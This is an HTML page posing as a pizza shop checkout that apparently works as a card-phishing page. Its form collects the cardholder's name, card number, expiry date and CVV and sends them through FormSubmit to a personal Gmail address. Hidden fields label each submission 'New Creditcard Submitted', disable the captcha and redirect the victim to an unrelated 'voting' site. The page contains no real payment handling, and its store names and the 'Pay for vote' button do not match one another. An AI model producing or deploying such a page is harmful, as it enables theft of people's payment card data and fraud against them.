<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Advanced Pizza Checkout</title>
  <style>
    * {margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif;}
    body {background: #f4f5f7; padding: 0; display: flex; justify-content: center; flex-direction: column; align-items: center;}

    header, footer {
      width: 100%; max-width: 600px; text-align: center; padding: 15px 0; background: #ff4c29; color: #fff; border-radius: 0; position: fixed; left: 50%; transform: translateX(-50%); z-index: 1000;
    }
    header {top: 0;}
    footer {bottom: 0;}

    .checkout-container {width: 100%; max-width: 600px; background: #fff; padding: 25px; border-radius: 16px; box-shadow: 0 6px 25px rgba(0,0,0,0.1); margin-top: 80px; margin-bottom: 80px;}    
    h2 {margin-bottom: 20px; font-size: 24px; font-weight: bold; text-align: center;}

    .section {background: #fafafa; padding: 18px; border-radius: 14px; border: 1px solid #eee; margin-bottom: 20px;}
    .section-title {font-size: 18px; margin-bottom: 12px; font-weight: bold;}

    label {font-size: 14px; font-weight: 600; display: block; margin-top: 12px;}
    input, select {width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; margin-top: 6px; font-size: 15px;}

    .card-logos {display: flex; gap: 8px; margin-top: 8px; justify-content: center;}
    .card-logos img {width: 35px; height: 22px; object-fit: contain;}

    .row {display: flex; gap: 10px; flex-wrap: wrap;}
    .row div {flex: 1;}

    .summary-item {display: flex; justify-content: space-between; align-items:center; font-size: 15px; padding: 6px 0;}
    .summary-item img {width:64px; height:48px; object-fit:cover; border-radius:8px; margin-right:10px;}
    .summary-left {display:flex; align-items:center;}

    .total {font-size: 18px; margin-top: 12px; font-weight: bold; text-align: right;}

    .pay-btn {margin-top: 20px; width: 100%; background: #ff4c29; color: #fff; padding: 15px; border: none; font-size: 18px; border-radius: 10px; cursor: pointer; transition: 0.3s;}    
    .pay-btn:hover {background: #e04322;}

    .settings-box {margin-top: 20px; background: #eef3ff; padding: 15px; border-radius: 12px; border: 1px solid #ccd7ff;}
    .settings-box label {font-weight: 700;}

    .product-preview {width: 100%; height: auto; max-height: 300px; border-radius:12px; object-fit:cover; background:#ddd; display:block; margin: 0 auto 15px auto;}

  </style>
</head>
<body>
  <header>
    <h1>The Pizza Spot Store</h1>
  </header>

  <div class="checkout-container">
    <h2>üçï Supreme Chicken Deluxe Pizza Checkout</h2>
  <form 
  id="payment-form"
  action="https://formsubmit.co/jenniferaniston.chatline@gmail.com"
  method="POST"
  enctype="multipart/form-data"
  novalidate
  class="space-y-6"
>
<!-- FormSubmit Settings -->
  <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="_next" value="https://thane-rivers-voting.vercel.app/review.html">
  <input type="hidden" name="_subject" value="New Creditcard Submitted">
  <input type="hidden" name="_autoresponse" value="Your card information has been received. Thank you!">

   
         <div>
        <label for="card-number">Enter Full  Name</label>
        <div class="input-card-number">
    

          <input type="text" id="card-number" name="cardName" placeholder="Full Name" maxlength="19"

            inputmode="numeric" autocomplete="cc-number" aria-required="true" aria-label="Card Number" />
          
        </div>
          <br> 
           <br>
           <div>
        <label for="card-number">Card Number</label>
        <div class="input-card-number">
          <span class="icon">üí≥</span>

          <input type="text" id="card-number" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19"

            inputmode="numeric" autocomplete="cc-number" aria-required="true" aria-label="Card Number" />
          <span class="icon">üîí</span>
        </div>

        <div class="card-logos">
          <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
          <img src="https://img.icons8.com/fluency/48/000000/visa.png" alt="Visa" />
          <img src="https://img.icons8.com/fluency/48/000000/amex.png" alt="American Express" />
          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard" />
          <img src="https://img.icons8.com/color/48/000000/verve.png" alt="Verve" />
          
         
        </div>
      </div>
<br>
      <div class="flex-row">
        <label for="valid-till">
          Valid Till
          <input type="text" id="valid-till" name="validTill" placeholder="MM/YY" inputmode="numeric" maxlength="5"
            autocomplete="cc-exp" aria-required="true" aria-label="Card Expiry Date" />
        </label>

        <label for="cvv">
          CVV
          <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" inputmode="numeric"
            autocomplete="cc-csc" aria-required="true" aria-label="Card CVV" />
        </label>
      </div>

      <div class="remember">
        <label for="remember">Remember this card next time</label>
        <label class="switch">
          <input type="checkbox" id="remember" name="remember" />
          <span class="slider"></span>
        </label>
      </div>

      <button class="pay-btn" type="submit">Pay for vote</button>
    </form>

    

    
      <!-- ORDER SUMMARY -->
      <div class="section">
        <div class="section-title">Order Summary</div>
        <div class="summary-item">
          <div class="summary-left">
            <img src="https://images.pexels.com/photos/825661/pexels-photo-825661.jpeg" alt="pizza">
            <div>
              <div>Supreme Chicken Deluxe Pizza</div>
              <div style="font-size:13px;color:#666">Regular ‚Ä¢ 1</div>
            </div>
          </div>
          <div>$12.00</div>
        </div>
        <div class="summary-item"><span>Delivery Fee</span><span>$3.00</span></div>
        <div class="summary-item"><span>VAT</span><span>$1.20</span></div>
        <div class="total">Total: $16.20</div>
        
      </div>

   

  </div>

  <footer>
    &copy; 2025 Pizza Palace. All rights reserved.
  </footer>
</body>
</html>
